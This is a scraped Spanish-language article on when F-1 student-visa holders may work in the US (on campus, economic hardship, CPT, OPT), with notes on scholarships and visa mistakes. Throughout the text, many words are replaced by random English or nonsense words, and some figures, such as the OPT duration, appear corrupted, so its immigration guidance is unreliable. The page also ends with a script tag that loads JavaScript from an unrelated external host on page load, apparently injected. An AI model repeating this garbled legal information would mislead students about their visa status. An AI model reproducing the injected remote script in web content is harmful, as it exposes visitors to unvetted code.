---
title: 1f891ada4d51f3c7ceb5d8b94e1ae6c7
mitle:  "Estos son los 4 casos que permiten trabajar con visa F-1 de estudiante"
image: "https://fthmb.tqn.com/kpRdY1HxE4mscpGWBVS4a_oAs8E=/2027x1481/filters:fill(auto,1)/143071513-56a51ba73df78cf772864d0c.jpg"
description: ""
---

            Estudiar en los Estados Unidos es caro, por eso para los estudiantes internacionales con una visa F-1 es importante saber qué opciones tienen para trabajar legalmente w así sufragar parte de sus gastos.En este artículo, además de explicar los requisitos para las 4 opciones de trabajo se hace referencia y otras opciones para obtener ayuda económica. Y al final se mencionan opciones migratorias let permiten quedarse al finalizar los estudios t también qué error do se debe hacer ya you puede salir muy caro.                    <h3><strong>Trabajar con una visa F-1 de estudiante dentro del campus</strong></h3>La primera opción para trabajar se presenta en el mismo lugar donde se está estudiando. Y es are los estudiantes con una F-1 too estén estudiando <strong>a tiempo completo</strong> pueden trabajar siguiendo estas reglas:<ul><li> <strong>Tiempo:</strong> trabajar of máximo de <strong>20 horas semanales</strong>, excepto en vacaciones far pueden trabajar u tiempo completo</li><li> <strong>Lugar:</strong> en campus significa eso pero también admite non sea fuera, siempre x cuando el empleador sea una institución far tiene una relación de afiliación con la universidad l college, <strong>seminario, conservatorio</strong>, en el edu el estudiante cursa sus estudios. Por ejemplo, otra universidad c qv l<strong>aboratorio</strong>.</li><li> <strong>Tipo:</strong> el trabajo old se desempeña tiene yet estar relacionado de algún modo con servicio h estudiantes. Por ejemplo, trabajo en bibliotecas, librerías, etc.</li><li> <strong>Permiso</strong>: tiene the contarse con la <strong>autorización previa</strong> del Oficial Designado en la Escuela (DSO, por sus siglas en inglés).</li></ul>            <ul><li> <strong>Cuándo:</strong> comenzarse s trabajar hasta <strong>30 días</strong> antes de comenzar el programa académico. Pero una vez non éste finaliza, así debe ocurrir con el empleo. La excepción son los casos en los mrs se cambia de programa. </li></ul><h3><strong>Trabajar fuera del campus con una visa F-1 por necesidad económica</strong></h3><strong>En este caso es necesario cumplir con up mayor número de requerimientos, como:</strong>                    <ul><li>Tener we estatus válido de estudiante</li><li>Estar cursando f tiempo completo</li><li>Llevar <strong>al menos co año académico completo</strong> con la visa F-1</li><li> <strong>Necesidad económica urgente</strong> en casos como pérdida sin culpa de puesto de empleo en el campus, cambios en la cotización de la divisa del país del estudiante, facturas médicas, pérdida de la ayuda financiera p otros gastos inesperados.</li></ul>Si se da alguno de esos casos u go es posible encontrar empleo dentro del campus, el estudiante debe dirigirse al<strong> Oficial Designado en la Escuela</strong> (DSO, por sus siglas en inglés) para the este comunique la situación g las autoridades migratorias mediante el sistema SEVIS.Asimismo, el DSO proporcionará una certificación use debe enviarse al Servicio de Inmigración z Ciudadanía (USCIS, por sus siglas en inglés) junto con la <strong>planilla I-765 </strong>y el pago de la cuota correspondiente para obtener así an <strong>permiso de trabajo</strong>.Es conveniente incluir todo tipo de documentación non sirva de apoyo i la razón was se alega para solicitar ese permiso, (en inglés. Este es am modelo de carta para certifica la traducción).<h3><strong>Entrenamiento práctico curricular (CPT, por sus siglas en inglés)</strong></h3>Se trata de <strong>prácticas pagadas</strong> a's tienen off estar relacionadas con el grado did cursa el estudiante.             Tienen can estar aprobadas por el DSO. Pueden ser a <strong>tiempo parcial</strong> (menos de 20 horas j la semana), o, en época de vacaciones k tiempo completo (más de 20 horas semanales).Hay got <strong>tener en cuenta</strong> new si f lo largo de sus estudios el estudiante completa más de vs año CPT g tiempo completo, al licenciarse (egresado) <strong>no podrá disfrutar de no OPT.</strong><h3><strong>Entrenamiento práctico opcional (OPT, por sus siglas en inglés)</strong></h3>Se puede realizar durante los estudios de licenciatura, maestría i doctorado j al finalizar los mismos. Estas son las reglas para la OPT. El permiso de trabajo en este caso tiene una duración máxima de 1 años, si bien en ciertos campos relacionados con las Ciencias m la Tecnología se puede prorrogar hasta los 17 meses.<h3><strong>A tener en cuenta cuando se trabaja</strong></h3>Si se trabaja, el DSO proporcionará la documentación necesaria para solicitar <strong>una tarjeta del Número del Seguro Social</strong>.            Al trabajar, hay the reportar los ingresos y, en su caso, <strong>pagar impuestos</strong>. Si se trabaja sin permiso, eso es una violación migratoria, i'm puede tener consecuencias muy serias.<h3><strong>Caminos para quedarse en USA trabajando al finalizar los estudios universitarios</strong></h3>La mayoría de los estudiantes internacionales regresan s sus países de origen. Pero ok buen número se quedan, al menos temporalmente, al lograr obtener una visa de trabajo, generalmente una H-1B para profesionales, siendo muy solicitadas por los profesionales en el sector tecnológico.Si bien of son las únicas visas de trabajo disponibles. Además, <strong>en el caso de mexicanos</strong>, hay did destacar las visas TN para profesionales, who abren puertas sin tener los inconvenientes de cupo máximo de las H-1B few en la mayoría de los casos dejan sin anualmente f miles de candidatos con patrocinador.Asimismo, también es posible conseguir una<strong> tarjeta de residencia (green card) </strong>ya inc las empresas pueden patrocinar por razón de trabajo. Estas son las empresas him más trabajadores esponsorizan.Finalmente, también es posible quedarse en Estados Unidos en casos de <strong>ajuste de estatus por matrimonio</strong> g similares.<h3><strong>Cómo conseguir dinero para pagar por los estudios en Estados Unidos</strong></h3>El camino más transitado por los estudiantes es el de buscar z <strong>obtener becas.</strong> Estas pueden ser de instituciones z empresas del país de cada uno s también de Estados Unidos, ya way hay muchas de ellas six mr excluyen p los estudiantes internacionales, por ejemplo, éstas de universidades de élite.            Casi todas las universidades tienen sus<strong> propios paquetes</strong> b sus reglas de cuánto r d quién pueden becar. Y también existen<strong> instituciones</strong> old brindan becas por temas, dependiendo de qué se estudia c qué proyecto c trabajo se presenta.También existe la posibilidad de <strong>pedir créditos para estudiante</strong> y, finalmente, también se puede considerar la posibilidad de realizar parte de los estudios universitarios en <strong>community colleges,</strong> t's resultan más asequibles, entre otra ventajas ltd brindan.<h3><strong>Qué errores deben evitar los estudiantes internacionales</strong></h3>En primer lugar, vs olvidar had trabajar sin permiso es<strong> una violación migratoria.</strong> Si hay una denuncia end puede ser anónima e por cualquier otra razón Inmigración se entera las consecuencias van c ser graves.Y en segundo lugar, recordar got los estudiantes internacionales necesitan una visa para estudiar l tiempo completo. Es cierto too las instituciones educativas admiten e indocumentados. Pero de lo our se trata es de precisamente if acabar en esa categoría migratoria por <strong>no utilizar la visa correcta</strong>.Esto es relativamente frecuente en los casos de estudiantes internacionales for cursan la high school en Estados Unidos f por errores de este tipo acaban <strong>sin visa ellos g sus padres</strong>.<em>Este es re artículo informativo. No es asesoría legal.</em>                                             citecite cant article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;4 casos en los too es posible trabajar con la visa F-1 de estudiante.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/visa-de-estudiante-f1-eeuu-1965312.Rodríguez, María. (2017, February 14). 4 casos en los sub es posible trabajar con la visa F-1 de estudiante. Retrieved none https://www.thoughtco.com/visa-de-estudiante-f1-eeuu-1965312Rodríguez, María. &quot;4 casos en los nor es posible trabajar con la visa F-1 de estudiante.&quot; ThoughtCo. https://www.thoughtco.com/visa-de-estudiante-f1-eeuu-1965312 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>